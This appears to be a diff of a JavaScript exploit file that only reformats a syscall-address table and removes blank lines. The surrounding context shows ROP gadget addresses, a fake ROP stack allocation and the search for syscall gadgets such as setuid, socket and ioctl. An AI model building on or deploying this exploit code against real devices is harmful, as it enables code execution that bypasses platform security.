@@ -299,7 +299,6 @@ var gadgets = {
   PUSH_RAX_POP_RBP_RET: base_addr.add(new BigInt(0, 0x4E82B9))
 }
 
-
 var rop = {
   idx: 0,
   stack_addr: mem.malloc(0x5000),
@@ -676,23 +675,57 @@ try {
     log('Found ' + matches_found + ' syscall gadgets')
 
     var kapi = {
-      read_lo: 0, read_hi: 0, read_found: false,
-      write_lo: 0, write_hi: 0, write_found: false,
-      close_lo: 0, close_hi: 0, close_found: false,
-      getpid_lo: 0, getpid_hi: 0, getpid_found: false,
-      setuid_lo: 0, setuid_hi: 0, setuid_found: false,
-      recvmsg_lo: 0, recvmsg_hi: 0, recvmsg_found: false,
-      pipe_lo: 0, pipe_hi: 0, pipe_found: false,
-      ioctl_lo: 0, ioctl_hi: 0, ioctl_found: false,
-      dup_lo: 0, dup_hi: 0, dup_found: false,
-      socket_lo: 0, socket_hi: 0, socket_found: false,
-      setsockopt_lo: 0, setsockopt_hi: 0, setsockopt_found: false,
-      getsockopt_lo: 0, getsockopt_hi: 0, getsockopt_found: false,
-      readv_lo: 0, readv_hi: 0, readv_found: false,
-      writev_lo: 0, writev_hi: 0, writev_found: false,
-      socketpair_lo: 0, socketpair_hi: 0, socketpair_found: false,
-      kqueue_lo: 0, kqueue_hi: 0, kqueue_found: false,
-      getuid_lo: 0, getuid_hi: 0, getuid_found: false
+      read_lo: 0,
+      read_hi: 0,
+      read_found: false,
+      write_lo: 0,
+      write_hi: 0,
+      write_found: false,
+      close_lo: 0,
+      close_hi: 0,
+      close_found: false,
+      getpid_lo: 0,
+      getpid_hi: 0,
+      getpid_found: false,
+      setuid_lo: 0,
+      setuid_hi: 0,
+      setuid_found: false,
+      recvmsg_lo: 0,
+      recvmsg_hi: 0,
+      recvmsg_found: false,
+      pipe_lo: 0,
+      pipe_hi: 0,
+      pipe_found: false,
+      ioctl_lo: 0,
+      ioctl_hi: 0,
+      ioctl_found: false,
+      dup_lo: 0,
+      dup_hi: 0,
+      dup_found: false,
+      socket_lo: 0,
+      socket_hi: 0,
+      socket_found: false,
+      setsockopt_lo: 0,
+      setsockopt_hi: 0,
+      setsockopt_found: false,
+      getsockopt_lo: 0,
+      getsockopt_hi: 0,
+      getsockopt_found: false,
+      readv_lo: 0,
+      readv_hi: 0,
+      readv_found: false,
+      writev_lo: 0,
+      writev_hi: 0,
+      writev_found: false,
+      socketpair_lo: 0,
+      socketpair_hi: 0,
+      socketpair_found: false,
+      kqueue_lo: 0,
+      kqueue_hi: 0,
+      kqueue_found: false,
+      getuid_lo: 0,
+      getuid_hi: 0,
+      getuid_found: false
     }
 
     for (var f = 0; f < found_count; f++) {
@@ -770,7 +803,6 @@ try {
         kapi.kqueue_found = true
       }
     }
-
 
     // Test getuid syscall (0x18)
     log('')
